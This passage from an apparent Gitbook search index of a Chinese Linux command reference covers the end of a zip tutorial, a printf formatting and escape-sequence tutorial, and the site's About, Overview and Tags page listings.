2.txt 3.txt 4.txt 5.txt 6.txt [root@localhost dir1]$ zip new.zip *.txt //压缩多个文件 adding: 1.txt (stored 0%) adding: 2.txt (stored 0%) adding: 3.txt (stored 0%) adding: 4.txt (stored 0%) adding: 5.txt (stored 0%) adding: 6.txt (stored 0%) [root@localhost dir1]$ ls 1.txt 2.txt 3.txt 4.txt 5.txt 6.txt new.zip $ rm -rf *.txt [root@localhost dir1]$ zip -d new.zip 1.txt //删除new.zip包中1.txt文件 deleting: 1.txt [root@localhost dir1]$ unzip new.zip Archive: new.zip extracting: 2.txt extracting: 3.txt extracting: 4.txt extracting: 5.txt extracting: 6.txt [root@localhost dir1]$ ls 2.txt 3.txt 4.txt 5.txt 6.txt new.zip [root@localhost dir1]$ touch 1.txt [root@localhost dir1]$ zip -g new.zip 1.txt //将1.txt添加到new.zip包中 adding: 1.txt (stored 0%) [root@localhost dir1]$ vim 1.txt //随意输入一些内容 sss test [root@localhost dir1]$ touch 7.txt //添加一个文件 [root@localhost dir1]$ zip -u new.zip 1.txt updating: 1.txt (stored 0%) [root@localhost dir1]$ zip -u new.zip 1.txt //查看1.txt文件是否有更改 updating: 1.txt (stored 0%) [root@localhost dir1]$ zip -u new.zip 1.txt //再次执行无效 [root@localhost dir1]$ zip -u new.zip * //查看当前目录下与new.zip中所有文件是否有更改或添加 adding: 7.txt (stored 0%) [root@localhost dir1]$ zip -u new.zip * //再次执行无效 [root@localhost dir1]$ zip -u new.zip 2.txt //无改动 1.将 /home/html/ 这个目录下所有文件和文件夹打包为当前目录下的 html.zip： zip -q -r html.zip /home/html 2.在 /home/html 目录下，可以执行以下命令： zip -q -r html.zip * 3.从压缩文件 cp.zip 中删除文件 a.c zip -dv cp.zip a.c 更多阅读： 更多阅读： Linux Command lz4 压缩 Linux Command tar 压缩 Linux Command gzip 压缩 Linux Command zip 压缩 图 1.2.97.1：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:24:52 "},"Linux-Command/Linux-Command_Printf.html":{"url":"Linux-Command/Linux-Command_Printf.html","title":"Linux Command Printf","keywords":"","body":"Linux Command printf 输出1. 简介2. 语法3. 参数4. 举例4.1 echo 与 printf4.2 格式输出4.3 转义序列Linux Command printf 输出 tagsstart 文件管理 tagsstop 1. 简介 printf 命令模仿 C 程序库（library）里的 printf() 程序。 标准所定义，因此使用printf的脚本比使用echo移植性好。 printf 使用引用文本或空格分隔的参数，外面可以在printf中使用格式化字符串，还可以制定字符串的宽度、左右对齐方式等。默认printf不会像 echo 自动添加换行符，我们可以手动添加 \\n。 2. 语法 printf format-string [arguments...] 3. 参数 format-string: 为格式控制字符串 arguments: 为参数列表。 4. 举例 4.1 echo 与 printf $ echo \"Hello, Shell\" Hello, Shell $ printf \"Hello, Shell\\n\" Hello, Shell 4.2 格式输出 #!/bin/bash printf \"%-10s %-8s %-4s\\n\" 姓名 性别 体重kg printf \"%-10s %-8s %-4.2f\\n\" 郭靖 男 66.1234 printf \"%-10s %-8s %-4.2f\\n\" 杨过 男 48.6543 printf \"%-10s %-8s %-4.2f\\n\" 郭芙 女 47.9876 执行脚本，输出结果如下所示： 姓名 性别 体重kg 郭靖 男 66.12 杨过 男 48.65 郭芙 女 47.99 %s %c %d %f都是格式替代符 %-10s 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐），任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。 %-4.2f 指格式化为小数，其中.2指保留2位小数。 #!/bin/bash # format-string为双引号 printf \"%d %s\\n\" 1 \"abc\" # 单引号与双引号效果一样 printf '%d %s\\n' 1 \"abc\" # 没有引号也可以输出 printf %s abcdef # 格式只指定了一个参数，但多出的参数仍然会按照该格式输出，format-string 被重用 printf %s abc def printf \"%s\\n\" abc def printf \"%s %s %s\\n\" a b c d e f g h i j # 如果没有 arguments，那么 %s 用NULL代替，%d 用 0 代替 printf \"%s and %d \\n\" 执行脚本，输出结果如下所示： 1 abc 1 abc abcdefabcdefabc def a b c d e f g h i j and 0 4.3 转义序列 \\a 警告字符，通常为ASCII的BEL字符 \\b 后退 \\c 抑制（不显示）输出结果中任何结尾的换行字符（只在%b格式指示符控制下的参数字符串中有效），而且，任何留在参数里的字符、任何接下来的参数以及任何留在格式字符串中的字符，都被忽略 \\f 换页（formfeed） \\n 换行 \\r 回车（Carriage return） \\t 水平制表符 \\v 垂直制表符 \\ 一个字面上的反斜杠字符 \\ddd 表示1到3位数八进制值的字符。仅在格式字符串中有效 \\0ddd 表示1到3位的八进制值字符 $ printf \"a string, no processing:\\n\" \"A\\nB\" a string, no processing: $ printf \"a string, no processing:\\n\" \"A\\nB\" a string, no processing: $ printf \"www.csdn.net \\a\" www.csdn.net 图 1.2.98.1：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:18:45 "},"About.html":{"url":"About.html","title":"About","keywords":"","body":"Linux Command DocsLinux Command Docs Linux Command Linux Command Ab Linux Command Alias Linux Command Apt Linux Command Arp Linux Command Bcc Linux Command Chcon Linux Command Cmp Linux Command Curl Linux Command Cut Linux Command Date Linux Command Dd Linux Command Diff Linux Command Dig Linux Command Dmsetup Linux Command Dnf Linux Command Dpkg Linux Command Dstat Linux Command Du Linux Command E 2 Fsck Linux Command Ebook Convert Linux Command Echo Linux Command Egrep Linux Command Emacs Linux Command Fdisk Linux Command Find Linux Command Fio Linux Command Gpg Linux Command Grep Linux Command Group Linux Command Gzip Linux Command Hping 3 Linux Command Iostat Linux Command Ip Linux Command Iperf 3 Linux Command Ipmitool Linux Command Iptables Linux Command Jq Linux Command Losetup Linux Command Lz 4 Linux Command Mpstat Linux Command Mv Linux Command Namp Linux Command Nano Linux Command Ncat Linux Command Nethogs Linux Command Netstat Linux Command Nsenter Linux Command Passwd Linux Command Perf Linux Command Pidstat Linux Command Ping Linux Command Pmap Linux Command Popd Linux Command Ps Linux Command Pstree Linux Command Pushd Linux Command Read Linux Command Route Linux Command Rpm Linux Command Rsync Linux Command Sar Linux Command Screen Linux Command Sed Linux Command Snap Linux Command Sort Linux Command Split Linux Command Ss Linux Command Ssh Keyscan Linux Command Sshpass Linux Command Strace Linux Command Stress Linux Command Sysbench Linux Command Tar Linux Command Tcpdump Linux Command Tee Linux Command Telnet Linux Command Test Linux Command Touch Linux Command Tput Linux Command Tr Linux Command Traceroute Linux Command Trap Linux Command Uniq Linux Command Uptime Linux Command User Linux Command Vim Linux Command Vmstat Linux Command Who Linux Command Wrk Linux Command Xargs Linux Command Zip Linux Commmand Awk Linux Command Printf About Tags Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-08-18 06:07:45 "},"Overview.html":{"url":"Overview.html","title":"Overview","keywords":"","body":"Linux Command DocsLinux Command Docs Linux Command Linux Command Ab Linux Command Alias Linux Command Apt Linux Command Arp Linux Command Awk Linux Command Bcc Linux Command Chcon Linux Command Cmp Linux Command Curl Linux Command Cut Linux Command Date Linux Command Dd Linux Command Diff Linux Command Dig Linux Command Dmsetup Linux Command Dnf Linux Command Dpkg Linux Command Dstat Linux Command Du Linux Command E 2 Fsck Linux Command Ebook Convert Linux Command Echo Linux Command Egrep Linux Command Emacs Linux Command Fdisk Linux Command Find Linux Command Fio Linux Command Gpg Linux Command Grep Linux Command Group Linux Command Gzip Linux Command Hping 3 Linux Command Iostat Linux Command Ip Linux Command Iperf 3 Linux Command Ipmitool Linux Command Iptables Linux Command Jq Linux Command Losetup Linux Command Lvextend Linux Command Lz 4 Linux Command Mount Linux Command Mpstat Linux Command Mv Linux Command Namp Linux Command Nano Linux Command Ncat Linux Command Nethogs Linux Command Netstat Linux Command Nsenter Linux Command Passwd Linux Command Perf Linux Command Pidstat Linux Command Ping Linux Command Pmap Linux Command Popd Linux Command Ps Linux Command Pstree Linux Command Pushd Linux Command Read Linux Command Route Linux Command Rpm Linux Command Rsync Linux Command Sar Linux Command Screen Linux Command Sed Linux Command Snap Linux Command Sort Linux Command Split Linux Command Ss Linux Command Ssh Keyscan Linux Command Sshpass Linux Command Strace Linux Command Stress Linux Command Sysbench Linux Command Tar Linux Command Tc Linux Command Tcpdump Linux Command Tee Linux Command Telnet Linux Command Test Linux Command Touch Linux Command Tput Linux Command Tr Linux Command Traceroute Linux Command Trap Linux Command Tree Linux Command Uniq Linux Command Uptime Linux Command User Linux Command Vgextend Linux Command Vim Linux Command Vmstat Linux Command Who Linux Command Wrk Linux Command Xargs Linux Command Zip Linux Command Printf About Overview Tags Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-11-14 08:05:04 "},"tags.html":{"url":"tags.html","title":"Tags","keywords":"","body":"Tags测试系统设置软件包管理网络协议文件管理监控分析设备管理文本管理文本处理编辑器lvm用户管理压缩解压设备容器性能系统管理远程进程shellTags 测试 Linux Command Ab Linux Command Fio Linux Command Iperf 3 Linux Command Stress Linux Command Sysbench Linux Command Wrk 系统设置 Linux Command Alias Linux Command Date 软件包管理 Linux Command Apt Linux Command Dnf Linux Command Dpkg Linux Command Rpm Linux Command Snap 网络 Linux Command Arp Linux Command Curl Linux Command Hping 3 Linux Command Ip Linux Command Iperf 3 Linux Command Iptables Linux Command Namp Linux Command Ncat Linux Command Netstat Linux Command Ping Linux Command Route Linux Command Sar Linux Command Ss Linux Command Telnet Linux Command Traceroute 协议 Linux Command Arp 文件管理 Linux Command Awk Linux Command Chcon Linux Command Cmp Linux Command Cut Linux Command Dd Linux Command Diff Linux Command Du Linux Command Egrep Linux Command Find Linux Command Gpg Linux Command Grep Linux Command Gzip Linux Command Jq Linux Command Lz 4 Linux Command Mount Linux Command Mv Linux Command Popd Linux Command Pushd Linux Command Rsync Linux Command Sed Linux Command Sort Linux Command Split Linux Command Tar Linux Command Tee Linux Command Touch Linux Command Tr Linux Command Uniq Linux Command Printf 监控 Linux Command Bcc Linux Command Iostat Linux Command Mpstat Linux Command Netstat Linux Command Pidstat Linux Command Pmap Linux Command Pstree Linux Command Sar Linux Command Tcpdump Linux Command Uptime Linux Command Vmstat 分析 Linux Command Bcc Linux Command Dstat Linux Command E 2 Fsck Linux Command Iostat Linux Command Mpstat Linux Command Netstat Linux Command Perf Linux Command Pidstat Linux Command Ps Linux Command Ss Linux Command Strace Linux Command Tcpdump Linux Command Traceroute Linux Command Uptime Linux Command Vmstat 设备管理 Linux Command Dmsetup Linux Command Ipmitool Linux Command Losetup 文本管理 Linux Command Ebook Convert Linux Command Read 文本处理 Linux Command Echo 编辑器 Linux Command Emacs Linux Command Nano Linux Command Tput Linux Command Vim lvm Linux Command Fdisk 用户管理 Linux Command Group Linux Command Passwd Linux Command User Linux Command Who 压缩解压 Linux Command Gzip Linux Command Lz 4 Linux Command Tar Linux Command Zip 设备 Linux Command Lvextend Linux Command Vgextend 容器 Linux Command Nsenter 性能 Linux Command Perf 系统管理 Linux Command Screen 远程 Linux Command Ssh Keyscan Linux Command Sshpass 进程 Linux Command Strace Linux Command Stress shell Linux Command Test Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 04:26:18 "}}